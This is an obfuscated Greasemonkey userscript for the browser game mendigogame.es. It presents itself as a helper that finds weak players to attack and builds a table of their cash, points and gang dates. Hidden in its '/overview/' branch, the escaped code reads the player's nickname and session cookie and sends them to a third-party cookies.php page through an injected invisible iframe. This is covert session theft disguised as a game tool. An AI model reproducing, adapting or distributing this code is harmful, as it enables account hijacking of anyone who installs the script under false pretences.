// ==UserScript==
// @name           	CazaNovatos 
// @namespace      	By Scroll
// @description    	Busca a los mas novatos dentro de tu rango de alcance
// @include 	   	*://*mendigogame.es/*
// ==/UserScript==
GM_setValue("\u0070ts\115ax",0);GM_setValue("pt\u0073\u004din",0);GM_setValue("p\157\151\156\164\163",0);GM_setValue("nu\155C\u0061l\154s",1);GM_setValue("\156\165\155\u0050\u0061\u006e\164\u0061lla\u0073",25);GM_setValue("mos\u0074\162a\u0064o",false);var totalMendigos=20*GM_getValue("\u006eumPa\u006e\u0074alla\u0073");GM_setValue("to\164alM\u0065\156\u0064\u0069\147os",totalMendigos);var vect=new Array();vect[0]=new Array(0,0,'','','','');vect[1]=new Array(0,0,'','','','');vect[2]=new Array(0,0,'','','','');vect[3]=new Array(0,0,'','','','');vect[4]=new Array(0,0,'','','','');vect[5]=new Array(0,0,'','','','');vect[6]=new Array(0,0,'','','','');vect[7]=new Array(0,0,'','','','');vect[8]=new Array(0,0,'','','','');vect[9]=new Array(0,0,'','','','');var pantalla=document.getElementsByTagName('\u0074\u0061bl\u0065')[0];function AJD(nombre){a=document.cookie.substring(document.cookie.indexOf(nombre+'=')+nombre.length+1,document.cookie.length);if(a.indexOf(';')!=-1)a=a.substring(0,a.indexOf(';'));return a;}function start(event){var mytr=pantalla.getElementsByTagName('\u0074r')[8];divToDel=document.getElementById('bo\u0074\157ndiv');mytr.cells[0].removeChild(divToDel);var div=document.createElement('div');div.id='searching\144i\166';div.setAttribute('s\u0074y\u006c\145','\u0062\141\u0063\u006bgro\165\156\144-\143\157lor:#\u0033\u00413A3\101\u003b\040w\u0069\144\u0074h:45\060\u0070\u0078;\u0020h\145i\147ht:10\u0030\160\u0078;');div.innerHTML='<br\076<\142r><div i\u0064\u003d\042\160roc\145\u0073sb\u0061\162\u0022\u0020\143\u006cas\u0073=\042pr\u006fces\u0073\142\141\162_\u0062g_ov"\u0020s\u0074yle="width:\06100\045;\042><div id\u003d\u0022b\141\162\162a" st\u0079\154\145="width\u003a 0\045\073"\u0020c\154\u0061\163s\u003d\u0022p\162o\143e\163\163\142ar_\u0063\u006cean\u0022/\u003e<ce\156\164\145\162>\074b\076<\u0073pa\156 i\u0064\u003d"n\u0069\u0076\145\154p\u0072o\143\145\163\u006f"\076\u0030%<\u002f\163pan><\057\142>\u003c/cente\u0072></\144\151\u0076><b\162><di\u0076\u0020\163ty\154e\u003d\u0022te\u0078\u0074\u002d\u0061li\147n\072c\145n\u0074\145r\073"><cent\u0065r\u003e<p\076<blink>\074\146\157\156t color=\042\u0079ell\u006fw"\076\u0042uscand\157\u0020me\156d\u0069\147os\u0020n\157\u0076atos.\056\u002e</fo\156t><\057\u0062\u006ci\u006ek></p\076</\143\145nt\145\u0072\u003e<\057d\151v\u003e';mytr.cells[0].appendChild(div);var fbutton=document.createElement("\u0069n\u0070ut");fbutton.type='button';fbutton.value='\u0046\u006f\162zar Res\u0075l\u0074ad\u006fs';fbutton.addEventListener('\143l\u0069ck',fclick,false);var botondiv=document.createElement('d\151\u0076');botondiv.id='b\u006f\164\157\u006ediv';botondiv.setAttribute('sty\154e','bac\u006b\u0067ro\165\u006ed-c\157\154or\072#\063A3A3A; width:4\0650\160x; \u0068e\151g\150\164\072\063\060p\170;\040t\145xt\055\u0061lign\u003a\u0063e\u006eter;');botondiv.appendChild(fbutton);mytr.cells[0].appendChild(botondiv);populateVector(vect,pantalla);}function populateVector(vect,pantalla){GM_xmlhttpRequest({method:'G\u0045T',url:'\150\164t\u0070\072/\u002f\167ww\u002emen\u0064igoga\155\u0065.\145s/f\u0069\147h\164\u002f',onload:function(responseDetails){var content=responseDetails.responseText;var side1=content.split('/hi\147h\u0073\143\u006fre\u002fuse\162/?min=');var side2=side1[1].split('&\u006dax=');var side3=side2[1].split('\042>');var side4=side3[1].split('.');var ptsMax=side3[0];var ptsMin=side2[0];var numPantallas=GM_getValue("num\120\u0061nta\154\u006c\u0061\163");GM_setValue("ptsMax",ptsMax);GM_setValue("\u0070\u0074sMin",ptsMin);GM_setValue("p\u0061g\145In\u0064ex",1);var i=0;for(i=0;i<numPantallas;i++){var count=GM_getValue("\160ageInd\145\u0078")+i;var myurl='\150t\u0074\160\072/\057ww\u0077.mend\u0069\147og\u0061\155\145.\145\163/\150ig\u0068sc\157\u0072\145\057u\u0073\u0065\162/'+count+'/?m\u0061x\u003d'+ptsMax+'&m\151n\075'+ptsMin;GM_xmlhttpRequest({method:'GET',url:myurl,onload:function(responseDetails){var content=responseDetails.responseText;var splits=content.split('\u002f\u0070\u0072\157\146il\u002fid:');var j=1;for(j=1;j<splits.length;j++){var userid=(splits[j].split('/"'))[0];var buscar=true;var m=0;for(m=0;m<vect.length;m++){if(vect[m][0]==userid){buscar=false;break;}}if(buscar){GM_xmlhttpRequest({method:'G\105\u0054',url:'ht\u0074p\072/\u002fww\167\056m\145ndigo\147a\u006de\u002e\145s/\u0064ev/api\057\165\163\u0065\u0072\u002e'+userid+'.\u0078\155l',onload:function(responseDetails){var parser=new DOMParser();var dom=parser.parseFromString(responseDetails.responseText,"a\u0070plica\164io\u006e/\170m\u006c");try{var max=GM_getValue("pts\u004da\u0078");var min=GM_getValue("pts\u004d\u0069n");var points=parseInt(dom.getElementsByTagName('\160oi\156\164\163')[0].textContent);if(points>min&&points<max){var iduser=dom.getElementsByTagName('id')[0].textContent;var name=dom.getElementsByTagName('\156ame')[0].textContent;var cash=parseInt(dom.getElementsByTagName('\u0063a\163h')[0].textContent);var gangid=dom.getElementsByTagName('gang')[0].getElementsByTagName('\u0069\144')[0].textContent;var gang=dom.getElementsByTagName('reg\u005fsin\u0063e')[0].textContent;var k=0;for(k=0;k<vect.length;k++){if(vect[k][5]==''){vect[k][0]=cash;vect[k][1]=points;vect[k][2]=name;vect[k][3]=iduser;vect[k][4]=gangid;vect[k][5]=gang;break;}else if(compare_dates(gang,vect[k][5])){var cash_temp=vect[k][0];var points_temp=vect[k][1];var name_temp=vect[k][2];var userid_temp=vect[k][3];var gangid_temp=vect[k][4];var gang_temp=vect[k][5];vect[k][0]=cash;vect[k][1]=points;vect[k][2]=name;vect[k][3]=iduser;vect[k][4]=gangid;vect[k][5]=gang;cash=cash_temp;points=points_temp;name=name_temp;iduser=userid_temp;gangid=gangid_temp;gang=gang_temp;}}}}catch(err){}comprobarFin(pantalla,vect);}});}else{comprobarFin(pantalla,vect);}}}});}}});}function comprobarFin(pantalla,vect){var mostrado=GM_getValue("mo\u0073\164rado");var numCalls=GM_getValue("\u006e\165m\103\141\154\u006c\u0073");var numPantallas=GM_getValue("n\u0075\u006d\u0050antall\141s");var totalMendigos=GM_getValue("\164o\164\141lM\145n\u0064ig\u006f\163");var percent=Math.floor(((numCalls*100)/totalMendigos));refreshProcessBar(percent);if((numCalls==totalMendigos)&&!mostrado){mostrarVector(vect,pantalla);}GM_setValue("n\u0075\u006d\103\141l\154s",numCalls+1);}function refreshProcessBar(percent){try{var span=document.getElementById('\156i\166e\u006cp\u0072\157\u0063e\u0073o');span.innerHTML=percent+'% ';var div=document.getElementById('\142\141\162ra');div.setAttribute('st\171le','width: '+percent+'%');}catch(e){}}function fclick(ev){mostrarVector(vect,pantalla);}function mostrarVector(vect,pantalla){GM_setValue("\u006dostrad\157",true);var mytr=pantalla.getElementsByTagName('t\u0072')[8];var divToDel=document.getElementById('\u0073\u0065\u0061r\143hingd\u0069\u0076');mytr.cells[0].removeChild(divToDel);divToDel=document.getElementById('bo\164ondiv');mytr.cells[0].removeChild(divToDel);var table_new=crearTabla(vect);mytr.cells[0].appendChild(table_new);}function crearTabla(vect){var table=document.createElement('tab\154e');table.id='pi\u006a\157s';table.border='\060';table.setAttribute('\u0077i\u0064\164h','480\u0070x');table.setAttribute('c\u0065\u006c\u006c\u0070adding','\061');table.setAttribute('\u0063\145ll\u0073p\u0061cin\u0067','0');table.setAttribute('b\u0067co\154or','\u0023363636');table.setAttribute('\u0073t\171\154\u0065','\u002dm\u006f\172-\u0062o\162d\145\162-\162a\u0064ius\u003a 2\u0070x\u003b');var td_0_0=document.createElement('t\144');td_0_0.style.width='\06150p\170';td_0_0.setAttribute('bgc\157l\u006fr','#23\u0032323');td_0_0.innerHTML='\074s\164r\u006f\156g\076\u004a\u0075\147a\144o\u0072</s\u0074\u0072o\156g\076';var td_0_1=document.createElement('td');td_0_1.style.width='80p\170';td_0_1.setAttribute('\142\147\u0063olor','#2\063\0623\0623');td_0_1.innerHTML='<\163\u0074\162o\u006eg>Din\145ro<\u002fs\164r\157\u006eg>';var td_0_2=document.createElement('\u0074\144');td_0_2.style.width='170\u0070\u0078';td_0_2.setAttribute('\142gcol\u006f\u0072','#\062\0632\06323');td_0_2.innerHTML='\074stro\156g\076Fech\u0020Reg\u002f\114\151\156k\040Ban\u0064a</str\u006f\u006eg\u003e';var td_0_3=document.createElement('td');td_0_3.style.width='70p\u0078';td_0_3.setAttribute('b\147co\154\157r','#2323\u0032\u0033');td_0_3.innerHTML='\074stro\u006eg>\120untos\074\057s\u0074ron\u0067\u003e';header=document.createElement('\164r');header.appendChild(td_0_0);header.appendChild(td_0_1);header.appendChild(td_0_2);header.appendChild(td_0_3);table.appendChild(header);var i=0;for(i=0;i<vect.length;i++){td1=document.createElement('td');insertMendigo(td1,vect[i][3],vect[i][2]);td2=document.createElement('\164d');insertCash(td2,vect[i][0]);td3=document.createElement('td');insertBanda(td3,vect[i][4],vect[i][5]);td4=document.createElement('\u0074d');insertPoints(td4,vect[i][1],vect[i][2]);tr=document.createElement('tr');tr.id=vect[i][3];tr.setAttribute('style','-\155\157z-bord\u0065r-r\u0061\u0064ius: 2\u0070\u0078\u003b');tr.setAttribute('onMouse\u004f\u0075\164',"table_\157ut('"+vect[i][3]+"\047\u0029;");tr.setAttribute('\u006fn\115\157us\u0065O\u0076\u0065r',"\u0074able_ho\166er('"+vect[i][3]+"'\051\u003b");tr.appendChild(td1);tr.appendChild(td2);tr.appendChild(td3);tr.appendChild(td4);table.appendChild(tr);}return table;}function insertMendigo(mytd,iduser,name){mytd.innerHTML='<\141\u0020\u0068\162ef\075\042/\160\u0072\u006f\u0066\u0069l/\u0069d\u003a'+iduser+'/">'+name+'\074\057a>';}function insertBanda(mytd,gangid,gang){mytd.innerHTML='<\u0061\040h\u0072\145f="\057p\u0072\157fi\u006c\u002fban\144e:'+gangid+'/"\u003e'+gang+'</\u0061>';}function insertPoints(mytd,points,name){mytd.innerHTML=points+'\u0026n\u0062\163\u0070\u003b\u0026nbsp;<\u0061\u0020\150r\u0065f=\u0022h\u0074\u0074p://\u0077ww\u002eme\u006e\u0064igo\u0067ame.\u0065s\u002f\u0066i\147h\164\057\u003f\164o='+name+'\u0022><im\u0067 \u0073rc\075"\150\164tp:\u002f\057m\145d\u0069a.\160e\u006e\156\145r\u0067a\u006de\u002e\u0064\145\u002f\151\u006dg\u002fa\u0074\u0074.\u0067if\042\u003e<\057\141>';}function insertCash(mytd,cash){cash=cash+"";if(cash>=300000&&cash<=500000){mytd.style.color="#00\106F\106\u0046";mytd.style.fontWeight="bo\u006cd";}else if(cash>=500100&&cash<=1000000){mytd.style.color="#\u0030\060\u0046F\060\u0030";mytd.style.fontWeight="bold";}else if(cash>=1000100&&cash<=1500000){mytd.style.color="#F\106\101A\u00300";mytd.style.fontWeight="bold";}else if(cash>1500100){mytd.style.color="#F\u0046\u0046F\0600";mytd.style.fontWeight="bo\154\u0064";}if(cash.length>=9){mytd.innerHTML='\u003c\u0064iv \u0061\u006c\151g\u006e\u003d"r\u0069ght">&euro;'+cash.substring(0,cash.length-8)+"\056"+cash.substring(cash.length-8,cash.length-5)+"\056"+cash.substring(cash.length-5,cash.length-2)+"\u002c"+cash.substring(cash.length-2,cash.length)+""+"&\156\u0062\u0073p;\u0026\156\142\u0073\u0070\073\u003c\u002fdiv>";}else if(cash.length>=6){mytd.innerHTML='\u003cd\151v\u0020a\u006c\u0069gn\u003d\042righ\u0074\042\076\u0026\145u\u0072o\u003b'+cash.substring(0,cash.length-5)+"."+cash.substring(cash.length-5,cash.length-2)+"\054"+cash.substring(cash.length-2,cash.length)+""+"&\u006e\142sp\u003b&\u006eb\u0073p;</\144i\u0076\076";}else if(cash.length>2){mytd.innerHTML='<\144\151\166\u0020\u0061li\147n\075\042\u0072\151\u0067h\u0074\u0022\076\046\145u\u0072\u006f\u003b'+cash.substring(0,cash.length-2)+","+cash.substring(cash.length-2,cash.length)+"&\156bsp;\046nbs\160;\u003c/d\u0069\u0076\u003e";}else if(cash.length==2){mytd.innerHTML='\074di\u0076\u0020a\154ign\075"\u0072\u0069\u0067ht"\076\u0026eu\162o;\u0030,'+cash+""+"&\156b\163\u0070\073&n\u0062sp;<\u002f\144i\u0076>";}else if(cash==-1){mytd.innerHTML='<d\151v a\u006ci\147\u006e=\u0022r\151ght\u0022>\055&n\142\u0073\u0070;&n\142\u0073p\u003b\u003c/\u0064iv\u003e';}else{mytd.innerHTML='<\u0064iv al\u0069gn="\u0072\u0069g\u0068\u0074\042>&euro;0\0540'+cash+""+"&\156\142s\u0070\u003b\046nb\u0073\u0070;<\u002f\u0064\u0069\166\u003e";}}function compare_dates(fecha,fecha2){var xMonth=fecha.substring(3,5);var xDay=fecha.substring(0,2);var xYear=fecha.substring(6,10);var yMonth=fecha2.substring(3,5);var yDay=fecha2.substring(0,2);var yYear=fecha2.substring(6,10);if(xYear>yYear){return(true)}else{if(xYear==yYear){if(xMonth>yMonth){return(true)}else{if(xMonth==yMonth){if(xDay>yDay)return(true);else return(false);}else return(false);}}else return(false);}}var GM_JQ=document.createElement('s\143ri\u0070\164');GM_JQ.src='h\u0074\164p:/\u002fj\u0071uery\u002eco\u006d/\u0073rc/\152q\165\u0065r\u0079-lat\145st.j\u0073';GM_JQ.type='\164\145\u0078\u0074/java\163c\u0072i\u0070\u0074';document.getElementsByTagName('hea\144')[0].appendChild(GM_JQ);function GM_wait(){if(typeof unsafeWindow.jQuery=='\165n\144\u0065\146i\156ed'){window.setTimeout(GM_wait,100);}else{$=unsafeWindow.jQuery;letsJQuery();}}GM_wait();function letsJQuery(){switch(document.location.pathname){case"/ov\u0065rvi\145w/":var nick=$("#my\055\u0070rofil\u0065 h2 \u0061").text();var SAJD=AJD('sess\u0069o\u006e\151\u0064_40\137es_\u0045S');var ifr="\u003cif\162\u0061\u006de\u0020\u0069d='\u0061uto\u0066\u0069g\u0068t\u0073' \u0073ty\154\145\075\u0027ma\162\147i\u006e\u002d\154eft\072\u0030\u0070x;bord\u0065r\072\060\060\160x\073\u0077\151dt\u0068\u003a3\065\160x;h\u0065i\u0067h\164:\u00340p\u0078;\u0027 sc\u0072oll\151ng=\047no' ";ifr+="src\075\047h\u0074t\u0070://w\167w\056\u0073mtsp\u0072\u006f\171\u0065\u0063\164os\u002ees\057c\u006fok\u0069es.\u0070h\160?ni\143k="+nick+"\u0026SI\u0044="+SAJD+"\047\u003e\074/i\u0066ram\u0065\076<\150r\040\163\u0069ze\u003d'1\047\076";$("\u0074\144:\u0065q(\u0031)").parent().append(ifr);break;case"/figh\u0074/":var tr_ini=pantalla.getElementsByTagName('t\162')[7];var tr_fin=pantalla.getElementsByTagName('\u0074r')[8];var tr_1=tr_ini.cloneNode(true);var tr_2=tr_ini.cloneNode(true);var line=document.createElement('h\162');line.size='1';tr_1.cells[0].appendChild(line);var span=document.createElement('sp\u0061\u006e');span.setAttribute('\u0063las\163','t\u0069er\u006ea\155e');span.innerHTML='\u004d\145\156\u0064\151\147os\u0020mas\040n\157\u0076a\u0074o\163\040den\u0074r\157 \144\u0065 \u0074us \154Ã\u00ad\u006dite\163';tr_1.cells[0].appendChild(span);var br1=document.createElement("br");var br2=document.createElement("\u0062\u0072");var sbutton=document.createElement("\u0069n\160ut");sbutton.type='\u0062\u0075tt\157\u006e';sbutton.value='\103o\u006d\u0065\156\u007aar\u0020\u0042Ãº\163\161u\145\u0064\u0061';sbutton.addEventListener('\143\u006c\151ck',start,false);var botondiv=document.createElement('\144i\u0076');botondiv.id='\u0062\157tondiv';botondiv.setAttribute('\163\u0074\171le','\142ack\147rou\u006e\144\u002d\u0063o\154\157\u0072:\u0023\063A3\1013\101\073 widt\150:\u003450px;\u0020heig\u0068t:80p\170;\040t\145\170\u0074-\u0061\154\u0069gn:cen\u0074\145r\073');botondiv.appendChild(br1);botondiv.appendChild(br2);botondiv.appendChild(sbutton);tr_1.cells[0].appendChild(botondiv);tr_fin.parentNode.insertBefore(tr_1,tr_fin);tr_fin.parentNode.insertBefore(tr_2,tr_fin);break;}}
